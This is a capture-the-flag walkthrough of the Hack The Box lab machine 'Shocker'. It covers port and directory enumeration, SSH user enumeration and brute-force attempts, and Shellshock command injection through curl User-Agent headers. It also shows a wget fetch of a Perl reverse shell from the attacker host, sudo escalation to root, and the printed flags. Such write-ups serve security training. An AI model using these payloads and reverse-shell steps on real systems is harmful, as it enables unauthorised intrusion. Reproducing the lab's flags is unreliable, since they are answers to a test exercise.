# Shocker

URL: https://app.hackthebox.com/machines/Shocker

Level: Easy

Date 28 Aug 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Sat Aug 28 17:11:01 2021 as: nmap -T4 -p- -oN 01_nmap 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.050s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

# Nmap done at Sat Aug 28 17:11:40 2021 -- 1 IP address (1 host up) scanned in 39.32 seconds
```

```
# Nmap 7.91 scan initiated Sat Aug 28 17:12:39 2021 as: nmap -T4 -sC -sV -p80,2222 -oN 02_nmap 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.044s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 28 17:13:00 2021 -- 1 IP address (1 host up) scanned in 21.56 seconds
```

On port 80/TCP we get a simple page:


![03_web](https://user-images.githubusercontent.com/42389836/157043269-71cee944-4229-48a6-b346-86d82151cb9d.png)

We look at HTML source:

```
<!DOCTYPE html>
<html>
<body>

<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html>
```

First `gobuster` run:

```
/server-status        (Status: 403) [Size: 299]
```

We look for some SSH vulnerability:

```
root@kali:/opt/htb/Shocker# searchsploit OpenSSH 7.2p2

------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                    | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                              | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                                                                                        | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                        | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                    | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                        | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                                                       | linux/remote/40113.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
root@kali:/opt/htb/Shocker#
root@kali:/opt/htb/Shocker#
```

We run `ssh_enumusers`:

```
msf6 > search ssh_enum

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_enumusers                       normal  No     SSH Username Enumeration
   1  auxiliary/scanner/ssh/ssh_enum_git_keys                   normal  No     Test SSH Github Access


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_enum_git_keys

msf6 > use auxiliary/scanner/ssh/ssh_enumusers
msf6 auxiliary(scanner/ssh/ssh_enumusers) > options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CHECK_FALSE  false            no        Check for false positives (random username)
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        22               yes       The target port
   THREADS      1                yes       The number of concurrent threads (max one per host)
   THRESHOLD    10               yes       Amount of seconds needed before a user is considered found (timing attack only)
   USERNAME                      no        Single username to test (username spray)
   USER_FILE                     no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet


msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RPORT 2222
RPORT => 2222
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 10.10.10.56
RHOSTS => 10.10.10.56
msf6 auxiliary(scanner/ssh/ssh_enumusers) > options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CHECK_FALSE  false            no        Check for false positives (random username)
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       10.10.10.56      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        2222             yes       The target port
   THREADS      1                yes       The number of concurrent threads (max one per host)
   THRESHOLD    10               yes       Amount of seconds needed before a user is considered found (timing attack only)
   USERNAME                      no        Single username to test (username spray)
   USER_FILE                     no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet


msf6 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 10.10.10.56:2222 - SSH - Using malformed packet technique
[-] Please populate USERNAME or USER_FILE
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/commix/src/txt/usernames.txt
USER_FILE => /usr/share/commix/src/txt/usernames.txt
msf6 auxiliary(scanner/ssh/ssh_enumusers) > options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name         Current Setting                          Required  Description
   ----         ---------------                          --------  -----------
   CHECK_FALSE  false                                    no        Check for false positives (random username)
   Proxies                                               no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       10.10.10.56                              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        2222                                     yes       The target port
   THREADS      1                                        yes       The number of concurrent threads (max one per host)
   THRESHOLD    10                                       yes       Amount of seconds needed before a user is considered found (timing attack only)
   USERNAME                                              no        Single username to test (username spray)
   USER_FILE    /usr/share/commix/src/txt/usernames.txt  no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet


msf6 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 10.10.10.56:2222 - SSH - Using malformed packet technique
[*] 10.10.10.56:2222 - SSH - Starting scan
[+] 10.10.10.56:2222 - SSH - User 'root' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_enumusers) >
```

A few tests with `hydra`:

```
root@kali:/opt/htb/Shocker# hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.10.10.56:2222 -t 4 -V
```

```
root@kali:/opt/htb/Shocker# hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.10.10.56:2222 -t 4 -V
```

Another run with `gobuster`:

```
root@kali:/opt/htb/Shocker# gobuster dir -u http://10.10.10.56:80 -w /usr/share/dirb/wordlists/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/28 19:52:16 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]

===============================================================
2021/08/28 19:52:20 Finished
===============================================================
```

We search for other extensions:

```
root@kali:/opt/htb/Shocker# gobuster dir -u http://10.10.10.56:80/cgi-bin/ -w /usr/share/dirb/wordlists/small.txt  -x sh,pl,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56:80/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,pl,php
[+] Timeout:                 10s
===============================================================
2021/08/28 19:53:01 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]

===============================================================
2021/08/28 19:53:19 Finished
===============================================================
```

It seems a very simple bash script:

```
Content-Type: text/plain

Just an uptime test script

 13:54:27 up  2:44,  0 users,  load average: 0.00, 0.00, 0.00
```

We try command execution:

```
root@kali:/opt/htb/Shocker# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/ping -c 3 10.10.14.7" http://10.10.10.56:80/cgi-bin/user.sh
PING 10.10.14.7 (10.10.14.7) 56(84) bytes of data.
64 bytes from 10.10.14.7: icmp_seq=1 ttl=63 time=43.2 ms
64 bytes from 10.10.14.7: icmp_seq=2 ttl=63 time=42.7 ms
64 bytes from 10.10.14.7: icmp_seq=3 ttl=63 time=43.1 ms
```



According to this:

https://www.sevenlayers.com/index.php/125-exploiting-shellshock

We try...

```
root@kali:/opt/htb/Shocker# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.10.10.56:80/cgi-bin/user.sh

uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

# User-flag

We get user flag:

```
root@kali:/opt/htb/Shocker# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/cat /home/shelly/user.txt" http://10.10.10.56:80/cgi-bin/user.sh

bb0de042385b777f6a781e021420d4dc
```

# Privesc

```
root@kali:/opt/htb/Shocker# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/sudo -l" http://10.10.10.56:80/cgi-bin/user.sh

Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```


We try this PERL reverse shell:

https://github.com/pentestmonkey/perl-reverse-shell/blob/master/perl-reverse-shell.pl


```
root@kali:/opt/htb/Shocker# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/wget http://10.10.14.7:8000/17_reverse_shell_perl -O /home/shelly/rev.pl" http://10.10.10.56:80/cgi-bin/user.sh


root@kali:/opt/htb/Shocker# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/chmod +x /home/shelly/rev.pl" http://10.10.10.56:80/cgi-bin/user.sh


```

We listen on our attacker box:

```
root@kali:/opt/htb/Shocker# nc -nlvp 4444
listening on [any] 4444 ...
```

```
root@kali:/opt/htb/Shocker# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/sudo /usr/bin/perl /home/shelly/rev.pl" http://10.10.10.56:80/cgi-bin/user.sh

Content-Length: 0
Connection: close
Content-Type: text/html

Content-Length: 41
Connection: close
Content-Type: text/html

Sent reverse shell to 10.10.14.7:4444<p>
```

And we receive shell:

```
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.56] 46704
 14:12:57 up  3:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
Linux Shocker 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
uid=0(root) gid=0(root) groups=0(root)
/
/usr/sbin/apache: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/
# cd root
# cat root.txt
cfb9e575e2c8e9a841c8f85df770bf3e
#

```
